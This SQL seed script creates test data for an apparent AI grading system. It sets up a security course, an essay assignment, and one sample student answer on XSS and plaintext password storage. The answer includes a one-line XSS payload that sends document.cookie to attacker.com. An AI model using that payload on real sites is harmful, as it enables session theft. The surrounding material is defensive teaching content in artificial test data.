-- Fixed seed script for AI Grading System test data
-- This script creates test data matching the CURRENT database schema

SET app.current_tenant_id = '550e8400-e29b-41d4-a716-446655440000';

-- ============================================================================
-- 1. CREATE TEST INSTITUTION (if needed)
-- ============================================================================

INSERT INTO grading.institutions (
  id,
  tenant_id,
  name,
  domain,
  created_at,
  updated_at
) VALUES
(
  '550e8400-e29b-41d4-a716-446655440000',
  '550e8400-e29b-41d4-a716-446655440000',
  'Test University',
  'test.edu',
  CURRENT_TIMESTAMP,
  CURRENT_TIMESTAMP
)
ON CONFLICT (tenant_id) DO NOTHING;

-- ============================================================================
-- 2. CREATE TEST COURSES (WITH institution_id)
-- ============================================================================

INSERT INTO grading.courses (
  id,
  tenant_id,
  institution_id,
  code,
  title,
  description,
  created_by_user_id,
  status,
  created_at,
  updated_at
) VALUES
(
  '423e4567-e89b-12d3-a456-426614174100',
  '550e8400-e29b-41d4-a716-446655440000',
  '550e8400-e29b-41d4-a716-446655440000',
  'SEC101',
  'Information Security Fundamentals',
  'Understanding security vulnerabilities and defenses',
  '223e4567-e89b-12d3-a456-426614174001',
  'ACTIVE',
  CURRENT_TIMESTAMP,
  CURRENT_TIMESTAMP
)
ON CONFLICT DO NOTHING;

-- ============================================================================
-- 3. CREATE COURSE ENROLLMENTS (WITH role enum, NO enrollment_status)
-- ============================================================================

INSERT INTO grading.course_enrollments (
  id,
  tenant_id,
  course_id,
  user_id,
  role,
  enrolled_at,
  created_at,
  updated_at
) VALUES
(
  '523e4567-e89b-12d3-a456-426614174100',
  '550e8400-e29b-41d4-a716-446655440000',
  '423e4567-e89b-12d3-a456-426614174100',
  '323e4567-e89b-12d3-a456-426614174002',
  'STUDENT',
  CURRENT_TIMESTAMP,
  CURRENT_TIMESTAMP,
  CURRENT_TIMESTAMP
),
(
  '523e4567-e89b-12d3-a456-426614174101',
  '550e8400-e29b-41d4-a716-446655440000',
  '423e4567-e89b-12d3-a456-426614174100',
  '223e4567-e89b-12d3-a456-426614174001',
  'INSTRUCTOR',
  CURRENT_TIMESTAMP,
  CURRENT_TIMESTAMP,
  CURRENT_TIMESTAMP
)
ON CONFLICT DO NOTHING;

-- ============================================================================
-- 4. CREATE TEST ASSIGNMENTS (WITH published_status, NO type column, WITH content JSONB)
-- ============================================================================

INSERT INTO grading.assignments (
  id,
  tenant_id,
  course_id,
  title,
  description,
  point_value,
  content,
  published_status,
  allow_incremental,
  published_at,
  created_by_user_id,
  created_at,
  updated_at
) VALUES
(
  '623e4567-e89b-12d3-a456-426614174101',
  '550e8400-e29b-41d4-a716-446655440000',
  '423e4567-e89b-12d3-a456-426614174100',
  'Security Vulnerability Analysis',
  'Identify, analyze, and remediate security vulnerabilities. Address all of the following in your response: (1) Identify and name the two security vulnerabilities described. (2) For each vulnerability, explain how a malicious actor could exploit it. (3) Recommend a specific, technical fix for each vulnerability. (4) Briefly explain why "security by obscurity" is not a sufficient defense strategy.',
  12,
  '{"questions": [{"id": "q-1", "type": "ESSAY", "prompt": "Security Vulnerability Analysis", "pointValue": 12, "minWords": 500}]}'::jsonb,
  'published',
  false,
  CURRENT_TIMESTAMP,
  '223e4567-e89b-12d3-a456-426614174001',
  CURRENT_TIMESTAMP,
  CURRENT_TIMESTAMP
)
ON CONFLICT DO NOTHING;

-- ============================================================================
-- 5. CREATE TEST SUBMISSIONS (WITH content JSONB, version, answer_status, question_count)
-- ============================================================================

INSERT INTO grading.submissions (
  id,
  tenant_id,
  assignment_id,
  student_id,
  version,
  is_incremental,
  content,
  answer_status,
  question_count,
  is_late,
  submitted_at,
  created_at,
  updated_at
) VALUES
(
  '723e4567-e89b-12d3-a456-426614174102',
  '550e8400-e29b-41d4-a716-446655440000',
  '623e4567-e89b-12d3-a456-426614174101',
  '323e4567-e89b-12d3-a456-426614174002',
  1,
  false,
  '{
    "answers": [
      {
        "questionId": "q-1",
        "type": "ESSAY",
        "answer": "(a) Vulnerability Identification\n\n1. Cross-Site Scripting (XSS)\n\nThe application displays user-submitted comments directly within web pages without properly sanitizing or encoding the content. As a result, malicious users can inject JavaScript code that executes in the browsers of other users who view the affected page.\n\n2. Insecure Password Storage (Plaintext Password Storage)\n\nThe application stores user passwords in plaintext within the database. This practice creates a significant security risk because anyone who gains unauthorized access to the database can immediately view and misuse all user credentials without requiring additional effort to decrypt or crack them.\n\n(b) Exploitation\n\nXSS Exploitation\n\nAn attacker can submit a comment containing malicious JavaScript code, such as:\n\n<script>\ndocument.location=''http://attacker.com/steal?cookie=''+document.cookie\n</script>\n\nWhen another user visits the page containing the malicious comment, the browser executes the embedded script. This allows the attacker to steal session cookies, hijack authenticated sessions, redirect users to phishing websites, capture keystrokes, display fake login forms, or perform unauthorized actions on behalf of the victim. Because the script executes within the trusted context of the legitimate website, it can bypass browser-based same-origin protections and compromise user security without their awareness.\n\nPlaintext Password Exploitation\n\nIf an attacker obtains access to the database through methods such as SQL injection, server misconfiguration, insider misuse, or a data breach, all stored passwords become immediately readable. Since the passwords are not hashed or encrypted, no password-cracking effort is required.\n\nThis vulnerability is particularly dangerous because many users reuse passwords across multiple online services. Consequently, a breach of a single application may lead to unauthorized access to email accounts, financial services, and other personal or business systems. Attackers can also leverage the exposed credentials to conduct large-scale credential stuffing attacks against additional websites and services.\n\n(c) Technical Fixes\n\nXSS Mitigation\n\nTo protect against Cross-Site Scripting attacks, the application should implement the following controls:\n\nInput Validation and Output Encoding: Validate user input and encode output before displaying it in the browser. For example, convert special characters such as < and > into their HTML entity equivalents (&lt; and &gt;) to prevent malicious code execution.\n\nContent Security Policy (CSP): Configure CSP headers to restrict the execution of unauthorized scripts and block inline JavaScript whenever possible.\n\nSecure Frameworks: Utilize frameworks with built-in XSS defenses, such as React, which automatically escapes rendered content, or Django, whose templating engine performs output escaping by default.\n\nHTML Sanitization: When rich HTML content must be accepted from users, sanitize it using trusted libraries such as DOMPurify to remove dangerous elements and attributes.\n\nPassword Security Improvements\n\nTo securely manage user credentials, the following best practices should be adopted:\n\nAvoid Plaintext Storage: Never store passwords in plaintext format.\n\nUse Strong Password Hashing Algorithms: Store passwords using modern adaptive hashing algorithms such as Argon2 (recommended), bcrypt, or PBKDF2.\n\nImplement Unique Salts: Generate and store a unique cryptographic salt for each user account to protect against rainbow table attacks.\n\nAdjust Work Factors: Periodically increase hashing cost parameters as computing power advances to maintain resistance against brute-force attacks.\n\nHash During Authentication: During login, hash the submitted password and compare it with the stored hash rather than comparing plaintext values.\n\n(d) Security by Obscurity\n\nSecurity by obscurity (hiding how a system works) is insufficient because determined attackers can reverse-engineer code and discover vulnerabilities. Source code can be leaked or stolen, system design details often become known over time, and it does not prevent attacks once the vulnerability is discovered. True security must be based on strong technical controls and cryptography, not on hiding implementation details. Real security relies on Kerckhoffs''s principle: a cryptosystem should be secure even if everything about the system, except the key, is public knowledge.",
        "submittedAt": "2026-10-04T14:30:00Z"
      }
    ],
    "startedAt": "2026-10-04T14:00:00Z",
    "completedAt": "2026-10-04T14:30:00Z"
  }'::jsonb,
  'submitted',
  1,
  false,
  CURRENT_TIMESTAMP,
  CURRENT_TIMESTAMP,
  CURRENT_TIMESTAMP
)
ON CONFLICT DO NOTHING;

-- ============================================================================
-- 6. VERIFY DATA WAS INSERTED
-- ============================================================================

SELECT 'INSTITUTIONS' as "Table", COUNT(*) as "Count" FROM grading.institutions WHERE tenant_id = '550e8400-e29b-41d4-a716-446655440000'
UNION ALL
SELECT 'COURSES', COUNT(*) FROM grading.courses WHERE tenant_id = '550e8400-e29b-41d4-a716-446655440000'
UNION ALL
SELECT 'ENROLLMENTS', COUNT(*) FROM grading.course_enrollments WHERE tenant_id = '550e8400-e29b-41d4-a716-446655440000'
UNION ALL
SELECT 'ASSIGNMENTS', COUNT(*) FROM grading.assignments WHERE tenant_id = '550e8400-e29b-41d4-a716-446655440000'
UNION ALL
SELECT 'SUBMISSIONS', COUNT(*) FROM grading.submissions WHERE tenant_id = '550e8400-e29b-41d4-a716-446655440000';

-- Show created data
SELECT '--- Test Submission Details ---' as detail;
SELECT id, student_id, version, is_late, submitted_at FROM grading.submissions WHERE tenant_id = '550e8400-e29b-41d4-a716-446655440000';

SELECT '--- Test Assignment Details ---' as detail;
SELECT id, title, published_status FROM grading.assignments WHERE tenant_id = '550e8400-e29b-41d4-a716-446655440000';
